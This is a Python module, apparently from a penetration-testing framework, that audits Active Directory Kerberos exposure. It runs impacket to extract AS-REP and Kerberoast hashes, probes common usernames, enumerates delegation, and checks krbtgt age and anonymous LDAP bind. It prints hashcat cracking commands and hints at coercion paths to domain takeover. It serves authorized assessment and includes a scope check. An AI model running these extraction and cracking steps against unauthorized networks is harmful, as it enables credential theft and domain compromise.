"""Kerberos Audit — Active Directory Kerberos attack surface assessment.

Checks:
  - AS-REP Roasting: accounts with "Do not require Kerberos preauthentication"
  - Kerberoasting:   service accounts with SPNs set (extractable TGS tickets)
  - Kerberos delegation: unconstrained + constrained delegation
  - LDAP anonymous bind (for enumeration without creds)
  - krbtgt password age (risk of Golden Ticket if previously compromised)
  - Ticket encryption types (RC4/DES → weak, AES preferred)

Tools used (if available): impacket GetNPUsers, GetUserSPNs, GetADUsers,
or raw LDAP queries if impacket not installed.

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import asyncio
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.finding import Severity


class KerberosAudit(BaseModule):
    """Kerberos attack surface audit for Active Directory environments."""

    NAME        = "kerberos_audit"
    DESCRIPTION = "Kerberos AS-REP roasting, Kerberoasting, delegation, and ticket analysis"
    PHASE       = 5
    TAGS        = ["active-directory", "kerberos", "roasting", "delegation", "ldap"]

    async def run(self) -> ModuleResult:
        start    = time.monotonic()
        target   = self.config.target.rstrip("/")
        dc_ip    = self.config.extra.get("dc_ip", target)
        domain   = self.config.extra.get("domain", "")
        username = self.config.extra.get("username", "")
        password = self.config.extra.get("password", "")
        lm_hash  = self.config.extra.get("lm_hash", "")
        nt_hash  = self.config.extra.get("nt_hash", "")

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Check ports 88 (Kerberos) and 389 (LDAP)
        kerberos_up = await self._check_port(dc_ip, 88)
        ldap_up     = await self._check_port(dc_ip, 389)

        if not kerberos_up and not ldap_up:
            return self._make_result(start, skipped=True,
                                     skip_reason="Kerberos (88) and LDAP (389) not reachable")

        if kerberos_up:
            self._add_info(dc_ip, f"Kerberos port 88 is open — DC or KDC detected")

        # AS-REP Roasting (no credentials needed)
        await self._check_asrep_roast(dc_ip, domain)

        # With credentials: Kerberoasting + delegation
        if username and (password or nt_hash):
            await self._check_kerberoast(dc_ip, domain, username, password, lm_hash, nt_hash)
            await self._check_delegation(dc_ip, domain, username, password, lm_hash, nt_hash)
            await self._check_krbtgt_age(dc_ip, domain, username, password, lm_hash, nt_hash)

        # LDAP anonymous bind
        if ldap_up:
            await self._check_ldap_anon(dc_ip)

        return self._make_result(start)

    # ── AS-REP Roasting ────────────────────────────────────────────────

    async def _check_asrep_roast(self, dc_ip: str, domain: str) -> None:
        """Find accounts with pre-auth disabled — hash extractable without creds."""
        cmd = ["python3", "-m", "impacket.examples.GetNPUsers",
               f"{domain}/", "-dc-ip", dc_ip, "-no-pass", "-format", "hashcat"]
        if not domain:
            cmd = ["GetNPUsers.py", "-dc-ip", dc_ip, "-no-pass", ""]

        result = await self._run_cmd(cmd, timeout=30)
        if result and ("$krb5asrep$" in result or "$23$" in result):
            hashes = [l for l in result.splitlines() if "$krb5asrep$" in l]
            self._add_finding(
                dc_ip,
                f"AS-REP Roastable accounts found ({len(hashes)}):\n"
                + "\n".join(hashes[:10]),
                Severity.HIGH,
                "Accounts without Kerberos pre-authentication allow offline hash cracking "
                "without any credentials. Crack with: hashcat -m 18200 hashes.txt wordlist.txt",
                "CVE-N/A — configuration issue",
            )
        elif result and "No entries found" in result:
            self._add_info(dc_ip, "AS-REP Roasting: no pre-auth disabled accounts found")
        else:
            # Fall back to native Kerberos probe
            await self._asrep_native(dc_ip, domain)

    async def _asrep_native(self, dc_ip: str, domain: str) -> None:
        """Raw Kerberos AS-REQ probe for common usernames."""
        common_users = [
            "administrator", "admin", "krbtgt", "backup", "service",
            "svc_backup", "svc_sql", "svc_web", "helpdesk",
        ]
        # Import impacket if available for raw Kerberos
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT
            from impacket.krb5 import constants
            from impacket.krb5.types import Principal
        except ImportError:
            self._add_info(dc_ip, "impacket not installed — AS-REP native probe skipped")
            return

        for user in common_users[:5]:
            await self.rate_limit()
            try:
                un  = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                tgt, cipher, _, session = getKerberosTGT(
                    un, "", domain.upper(), kdcHost=dc_ip
                )
                # Success without pre-auth → vulnerable
                self._add_finding(
                    dc_ip,
                    f"AS-REP Roastable: user '{user}' has pre-authentication disabled",
                    Severity.HIGH,
                    "Account obtainable without credentials",
                    "N/A",
                )
            except Exception:
                pass

    # ── Kerberoasting ──────────────────────────────────────────────────

    async def _check_kerberoast(self, dc_ip: str, domain: str, user: str,
                                 pw: str, lm: str, nt: str) -> None:
        """Find service accounts with SPNs — TGS tickets crackable offline."""
        hash_arg = f"-hashes {lm or 'aad3b435b51404eeaad3b435b51404ee'}:{nt}" if nt else ""
        pw_arg   = f"'{pw}'" if pw else ""

        cmd = ["python3", "-m", "impacket.examples.GetUserSPNs",
               f"{domain}/{user}:{pw}" if pw else f"{domain}/{user}",
               "-dc-ip", dc_ip, "-request", "-format", "hashcat"]
        if nt:
            cmd = ["GetUserSPNs.py", f"{domain}/{user}", "-hashes",
                   f"{lm or 'aad3b435b51404eeaad3b435b51404ee'}:{nt}",
                   "-dc-ip", dc_ip, "-request"]

        result = await self._run_cmd(cmd, timeout=45)
        if result and "$krb5tgs$" in result:
            hashes = [l for l in result.splitlines() if "$krb5tgs$" in l]
            self._add_finding(
                dc_ip,
                f"Kerberoastable SPNs found ({len(hashes)} TGS tickets):\n"
                + "\n".join(hashes[:5]),
                Severity.HIGH,
                "Service accounts with SPNs allow offline TGS ticket cracking. "
                "Crack RC4-encrypted tickets with: hashcat -m 13100 tickets.txt wordlist.txt",
                "N/A — configuration risk",
            )

    # ── Delegation ────────────────────────────────────────────────────

    async def _check_delegation(self, dc_ip: str, domain: str, user: str,
                                 pw: str, lm: str, nt: str) -> None:
        """Find accounts with unconstrained or constrained delegation."""
        # Query via LDAP for delegation attributes
        try:
            import ldap3
        except ImportError:
            self._add_info(dc_ip, "ldap3 not installed — delegation check skipped")
            return

        try:
            server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL)
            cred   = ldap3.Connection(
                server, user=f"{domain}\\{user}", password=pw, authentication=ldap3.NTLM
            )
            cred.bind()

            base_dn = ",".join(f"DC={p}" for p in domain.split("."))

            # Unconstrained delegation: userAccountControl & 0x80000 (TRUSTED_FOR_DELEGATION)
            cred.search(
                base_dn,
                "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
                attributes=["sAMAccountName", "userAccountControl"],
            )
            unconst = [e.sAMAccountName.value for e in cred.entries
                       if e.sAMAccountName != "krbtgt"]

            # Constrained delegation: msDS-AllowedToDelegateTo set
            cred.search(
                base_dn,
                "(msDS-AllowedToDelegateTo=*)",
                attributes=["sAMAccountName", "msDS-AllowedToDelegateTo"],
            )
            const = [(e.sAMAccountName.value, list(e["msDS-AllowedToDelegateTo"]))
                     for e in cred.entries]

            if unconst:
                self._add_finding(
                    dc_ip,
                    f"Unconstrained Kerberos delegation on {len(unconst)} accounts: "
                    + ", ".join(unconst[:10]),
                    Severity.HIGH,
                    "Unconstrained delegation allows TGT theft from connecting users — "
                    "combine with printer bug or coerce authentication for DC takeover.",
                    "N/A",
                )
            if const:
                detail = "\n".join(f"  {u} → {svcs}" for u, svcs in const[:5])
                self._add_finding(
                    dc_ip,
                    f"Constrained delegation on {len(const)} accounts:\n{detail}",
                    Severity.MEDIUM,
                    "Constrained delegation abuse can allow impersonating any user "
                    "to the allowed services (S4U2Proxy attack).",
                    "N/A",
                )
        except Exception as exc:
            self.log.debug("Kerberos delegation LDAP: %s", exc)

    # ── krbtgt age ────────────────────────────────────────────────────

    async def _check_krbtgt_age(self, dc_ip: str, domain: str, user: str,
                                 pw: str, lm: str, nt: str) -> None:
        """Check krbtgt account password age via LDAP."""
        try:
            import ldap3, datetime
            server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL)
            conn   = ldap3.Connection(
                server, user=f"{domain}\\{user}", password=pw, authentication=ldap3.NTLM
            )
            conn.bind()
            base_dn = ",".join(f"DC={p}" for p in domain.split("."))
            conn.search(base_dn, "(sAMAccountName=krbtgt)",
                        attributes=["pwdLastSet", "sAMAccountName"])
            for e in conn.entries:
                pwd_set = e.pwdLastSet.value
                if pwd_set:
                    age_days = (datetime.datetime.now(datetime.timezone.utc) - pwd_set).days
                    if age_days > 180:
                        self._add_finding(
                            dc_ip,
                            f"krbtgt password not changed in {age_days} days. "
                            f"Last changed: {pwd_set.date()}. "
                            f"If krbtgt hash was previously exposed, Golden Tickets may still be valid.",
                            Severity.MEDIUM,
                            "Rotate krbtgt password twice (24h apart) to invalidate all "
                            "existing Kerberos tickets including Golden Tickets.",
                            "N/A",
                        )
        except Exception as exc:
            self.log.debug("krbtgt age: %s", exc)

    # ── LDAP anonymous ────────────────────────────────────────────────

    async def _check_ldap_anon(self, dc_ip: str) -> None:
        """Check if LDAP allows anonymous bind (unauthenticated enumeration)."""
        try:
            import ldap3
            server = ldap3.Server(dc_ip, port=389, get_info=ldap3.NONE)
            conn   = ldap3.Connection(server, authentication=ldap3.ANONYMOUS)
            conn.bind()
            if conn.bound:
                self._add_finding(
                    dc_ip,
                    "LDAP anonymous bind ALLOWED — unauthenticated enumeration possible",
                    Severity.MEDIUM,
                    "Disable anonymous LDAP bind in Active Directory. Set restrictAnonymous=2.",
                    "N/A",
                )
        except Exception:
            pass

    # ── Helpers ────────────────────────────────────────────────────────

    async def _check_port(self, host: str, port: int) -> bool:
        try:
            _, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=5)
            w.close()
            return True
        except Exception:
            return False

    async def _run_cmd(self, cmd: list[str], timeout: int = 30) -> str | None:
        try:
            proc = await asyncio.wait_for(
                asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                ),
                timeout=timeout,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return stdout.decode(errors="replace")
        except Exception:
            return None

    def _add_finding(self, host: str, detail: str, severity: Severity,
                     remediation: str = "", cve: str = "") -> None:
        from common.finding import Finding
        self.findings.append(Finding(
            title       = "Kerberos Configuration Risk",
            description = detail,
            severity    = severity,
            host        = host,
            evidence    = detail,
            remediation = remediation or "Review Kerberos configuration and apply hardening.",
            references  = [
                "https://adsecurity.org/?p=2293",
                "https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/",
            ],
            cve         = cve,
        ))

    def _add_info(self, host: str, msg: str) -> None:
        from common.finding import Finding
        self.findings.append(Finding(
            title       = "Kerberos Info",
            description = msg,
            severity    = Severity.INFO,
            host        = host,
            evidence    = msg,
            remediation = "",
        ))
